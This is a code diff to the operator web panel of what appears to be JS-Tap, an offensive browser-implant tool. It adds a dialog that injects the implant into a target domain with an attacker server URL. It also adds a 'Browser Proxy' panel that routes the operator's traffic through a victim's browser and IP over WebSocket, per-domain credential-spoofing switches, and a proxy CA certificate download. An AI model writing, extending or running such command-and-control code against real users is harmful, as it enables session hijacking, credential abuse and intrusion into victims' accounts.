@@ -158,6 +158,55 @@ function showPromptModal(title, message, defaultValue, callback) {
 }
 
 
+function downloadCaCert() {
+    fetch('/api/proxy/ca_cert')
+        .then(function(resp) {
+            if (!resp.ok) throw new Error('Download failed: ' + resp.status);
+            return resp.blob();
+        })
+        .then(function(blob) {
+            var url = URL.createObjectURL(blob);
+            var a = document.createElement('a');
+            a.href = url;
+            a.download = 'jstap-proxy-ca.pem';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        })
+        .catch(function(err) {
+            alert('CA cert download failed: ' + err.message);
+        });
+}
+
+
+function showInjectOptionsModal(domain, callback) {
+    var modalEl = document.getElementById('injectOptionsModal');
+    document.getElementById('injectOptionsDomain').textContent = 'Target: ' + domain;
+    var tagInput = document.getElementById('injectTagInput');
+    var serverInput = document.getElementById('injectServerInput');
+    tagInput.value = 'bex-injected';
+    serverInput.value = window.location.origin; // temporary default until fetch completes
+    fetch('/api/bex/server_url').then(function(r) { return r.json(); }).then(function(data) {
+        if (data.serverUrl) serverInput.value = data.serverUrl;
+    });
+    var okBtn = document.getElementById('injectOptionsOk');
+    var modal = new bootstrap.Modal(modalEl);
+    var newOk = okBtn.cloneNode(true);
+    okBtn.parentNode.replaceChild(newOk, okBtn);
+    newOk.addEventListener('click', function() {
+        var tag = tagInput.value.trim();
+        var serverUrl = serverInput.value.trim();
+        if (!tag) { tagInput.focus(); return; }
+        if (serverUrl && !serverUrl.startsWith('http')) { serverInput.focus(); return; }
+        modal.hide();
+        callback(tag, serverUrl);
+    });
+    modal.show();
+    setTimeout(function() { tagInput.focus(); tagInput.select(); }, 300);
+}
+
+
 function showClientFilterModal()
 {
 	var modal = new bootstrap.Modal(document.getElementById("clientFilterModal"));
@@ -2910,10 +2959,10 @@ function toggleBexInjection(beaconID, domain, isActive) {
             });
         });
     } else {
-        showPromptModal('Inject JS-Tap', 'Enter a tag for the injected client:', 'bex-injected', function(tag) {
+        showInjectOptionsModal(domain, function(tag, serverUrl) {
             fetch('/api/bex/inject', {
                 method: 'POST',
-                body: JSON.stringify({ beaconID: beaconID, domain: domain, tag: tag }),
+                body: JSON.stringify({ beaconID: beaconID, domain: domain, tag: tag, serverUrl: serverUrl }),
                 headers: { "Content-type": "application/json; charset=UTF-8" }
             }).then(function() {
                 showToast('Injection queued for ' + domain);
@@ -3521,6 +3570,9 @@ async function getClientDetails(id)
                 }
             }
 
+            // Proxy panel
+            try { await renderProxyPanel(cardStack, id, client); } catch(e) { console.error('Proxy panel error:', e); }
+
             var domainsReq = await fetch('/api/bex/domains/' + id);
             var domains = await domainsReq.json();
 
@@ -3897,6 +3949,150 @@ async function getClientDetails(id)
 
 
 
+
+
+// ---------------------------------------------------------------------------
+// Proxy panel for beacon detail view
+// ---------------------------------------------------------------------------
+
+async function renderProxyPanel(cardStack, beaconId, client) {
+    let panel = document.getElementById('proxy-panel');
+
+    // Preserve collapse state across re-renders
+    var wasExpanded = false;
+    if (panel) {
+        var existingCollapse = panel.querySelector('#proxy-collapse');
+        if (existingCollapse) {
+            wasExpanded = existingCollapse.classList.contains('show');
+        }
+    }
+
+    // Fetch current proxy status
+    var statusResp = await fetch('/api/proxy/status');
+    var proxyStatus = await statusResp.json();
+
+    var isThisBeaconActive = proxyStatus.running && proxyStatus.beaconID === client.uuid;
+    var wsConnected = proxyStatus.wsConnected;
+
+    if (!panel) {
+        panel = document.createElement('div');
+        panel.id = 'proxy-panel';
+        panel.className = 'card mb-3 border-info';
+        cardStack.appendChild(panel);
+    }
+
+    // Status badge
+    var statusBadge = '';
+    if (isThisBeaconActive) {
+        if (wsConnected) {
+            statusBadge = '<span class="badge bg-success">Connected</span>';
+        } else {
+            statusBadge = '<span class="badge bg-warning text-dark">Waiting for beacon...</span>';
+        }
+    } else if (proxyStatus.running) {
+        statusBadge = '<span class="badge bg-secondary">Active on another beacon</span>';
+    }
+
+    // Build domain spoofing toggles if proxy is active for this beacon
+    var spoofHtml = '';
+    if (isThisBeaconActive) {
+        var domainsReq = await fetch('/api/bex/domains/' + beaconId);
+        var domains = await domainsReq.json();
+        var spoofConfig = proxyStatus.spoofConfig || {};
+
+        if (domains.length > 0) {
+            spoofHtml = '<div class="mt-2"><small class="text-muted">Credential spoofing per domain:</small>';
+            spoofHtml += '<div class="list-group list-group-flush mt-1">';
+            for (var d of domains) {
+                var isOn = !!spoofConfig[d.domain];
+                var checkId = 'spoof-' + d.domain.replace(/[^a-zA-Z0-9]/g, '-');
+                spoofHtml += '<div class="list-group-item bg-dark text-white d-flex justify-content-between align-items-center py-1 px-2">';
+                spoofHtml += '<small>' + escapeHTML(d.domain) + '</small>';
+                spoofHtml += '<div class="form-check form-switch mb-0">';
+                spoofHtml += '<input class="form-check-input proxy-spoof-toggle" type="checkbox" id="' + checkId + '" data-domain="' + escapeHTML(d.domain) + '"' + (isOn ? ' checked' : '') + '>';
+                spoofHtml += '</div></div>';
+            }
+            spoofHtml += '</div></div>';
+        }
+    }
+
+    panel.innerHTML = `
+        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center" style="cursor:pointer;" data-bs-toggle="collapse" data-bs-target="#proxy-collapse" aria-expanded="${wasExpanded ? 'true' : 'false'}" aria-controls="proxy-collapse">
+            <span><b>Browser Proxy</b> ${statusBadge}</span>
+            <svg id="proxy-chevron" width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="transition: transform 0.25s ease; transform: rotate(${wasExpanded ? '0deg' : '-90deg'});">
+                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/>
+            </svg>
+        </div>
+        <div class="collapse${wasExpanded ? ' show' : ''}" id="proxy-collapse">
+        <div class="card-body p-3">
+            <p class="small text-muted mb-2">Route your browser traffic through this beacon. Requests are fetched from the victim's browser/IP via WebSocket.</p>
+            <div class="d-flex gap-2 align-items-center mb-2">
+                ${isThisBeaconActive
+                    ? '<button class="btn btn-outline-danger btn-sm" id="proxy-stop-btn">Stop Proxy</button>'
+                    : '<button class="btn btn-outline-success btn-sm" id="proxy-start-btn"' + (proxyStatus.running ? ' disabled title="Proxy active on another beacon"' : '') + '>Start Proxy</button>'
+                }
+                ${isThisBeaconActive ? '<span class="small text-info">Proxy: <b>127.0.0.1:8445</b></span>' : ''}
+                ${isThisBeaconActive ? '<button class="btn btn-outline-info btn-sm" onclick="downloadCaCert()">Download CA Cert</button>' : ''}
+            </div>
+            ${spoofHtml}
+        </div>
+        </div>
+    `;
+
+    // Collapse chevron animation
+    var collapseEl = panel.querySelector('#proxy-collapse');
+    if (collapseEl) {
+        collapseEl.addEventListener('hide.bs.collapse', function() {
+            var chev = document.getElementById('proxy-chevron');
+            if (chev) chev.style.transform = 'rotate(-90deg)';
+        });
+        collapseEl.addEventListener('show.bs.collapse', function() {
+            var chev = document.getElementById('proxy-chevron');
+            if (chev) chev.style.transform = 'rotate(0deg)';
+        });
+    }
+
+    // Wire up start/stop buttons
+    var startBtn = document.getElementById('proxy-start-btn');
+    if (startBtn) {
+        startBtn.onclick = async function() {
+            startBtn.disabled = true;
+            startBtn.textContent = 'Starting...';
+            await fetch('/api/proxy/start', {
+                method: 'POST',
+                body: JSON.stringify({ beaconID: beaconId }),
+                headers: { "Content-type": "application/json; charset=UTF-8" }
+            });
+            showToast('Proxy started — configure browser to use 127.0.0.1:8445');
+            getClientDetails(beaconId);
+        };
+    }
+
+    var stopBtn = document.getElementById('proxy-stop-btn');
+    if (stopBtn) {
+        stopBtn.onclick = async function() {
+            stopBtn.disabled = true;
+            stopBtn.textContent = 'Stopping...';
+            await fetch('/api/proxy/stop', { method: 'POST', headers: { "Content-type": "application/json; charset=UTF-8" } });
+            showToast('Proxy stopped');
+            getClientDetails(beaconId);
+        };
+    }
+
+    // Wire up spoof toggles
+    panel.querySelectorAll('.proxy-spoof-toggle').forEach(function(toggle) {
+        toggle.addEventListener('change', async function() {
+            var domain = this.getAttribute('data-domain');
+            var enabled = this.checked;
+            await fetch('/api/proxy/spoof', {
+                method: 'POST',
+                body: JSON.stringify({ domain: domain, enabled: enabled }),
+                headers: { "Content-type": "application/json; charset=UTF-8" }
+            });
+            showToast((enabled ? 'Spoofing enabled for ' : 'Spoofing disabled for ') + domain);
+        });
+    });
+}
 
 
 function unselectAllClients()
